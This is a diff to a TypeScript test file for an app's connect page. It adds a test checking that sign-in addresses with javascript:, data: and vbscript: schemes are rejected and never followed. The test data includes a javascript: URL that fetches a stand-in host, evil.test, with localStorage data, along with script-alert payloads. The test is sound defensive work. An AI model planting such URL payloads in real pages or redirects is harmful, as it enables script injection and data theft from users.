@@ -13,7 +13,7 @@ import { createAppRouter } from '../app/router.ts';
 import { fakeChat, fakeChatApi } from '../chat/test/fakes.ts';
 import { STORES } from '../state/stores.ts';
 import { CALENDAR_DECL, calendarConnection, fakeConnectionsApi } from '../test/connections.ts';
-import { fakeStores, tokens } from '../test/fakes.ts';
+import { fakeCaller, fakeStores, tokens } from '../test/fakes.ts';
 import { fakePickerApi } from '../test/pickers.ts';
 import { connectNav, fnRows, pageConnections, pickedSettings, settingsPicks, withFnOption } from './logic.ts';
 import { ConnectionsStore } from './store.ts';
@@ -88,9 +88,10 @@ describe('ConnectionsStore', () => {
 });
 
 /** Mount the app at a connect page, signed in as Ada, over a hub with `connect` as its one page. */
-async function visit(connect: Partial<ConnectPage>, multiUser = false) {
+async function visit(connect: Partial<ConnectPage>, multiUser = false, signInUrl?: string) {
   const fakes = fakeStores({ signedIn: true });
   const api = { ...fakeChatApi(), ...fakePickerApi(multiUser), ...fakeConnectionsApi(connect) };
+  if (signInUrl !== undefined) { api.connect = fakeCaller<'connect'>(() => Promise.resolve({ url: signInUrl })); }
   const { chat } = fakeChat({ api });
   const stores = { ...fakes.stores, chat };
   const router = createAppRouter(stores.session, createMemoryHistory());
@@ -120,6 +121,18 @@ describe('the connect page', () => {
     expect(api.connect.calls).toEqual([[{ system: CALENDAR }]]);
     expect(assign).toHaveBeenCalledWith('https://accounts.example.com/sign-in');
     app.unmount();
+  });
+
+  it('never follows a script or data sign-in address a system sent (H2)', async () => {
+    const assign = vi.spyOn(window.location, 'assign').mockImplementation(() => undefined);
+    for (const url of ['javascript:fetch(`//evil.test/?t=${localStorage.length}`)', 'JavaScript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)']) {
+      const { app } = await visit({}, false, url);
+      testid('connect-start')?.click();
+      await flushPromises();
+      expect(testid('connect-problem')?.textContent).toContain('isn’t a web address');
+      app.unmount();
+    }
+    expect(assign).not.toHaveBeenCalled();
   });
 
   it('switches a fn and shows sharing only on a hub with several people', async () => {
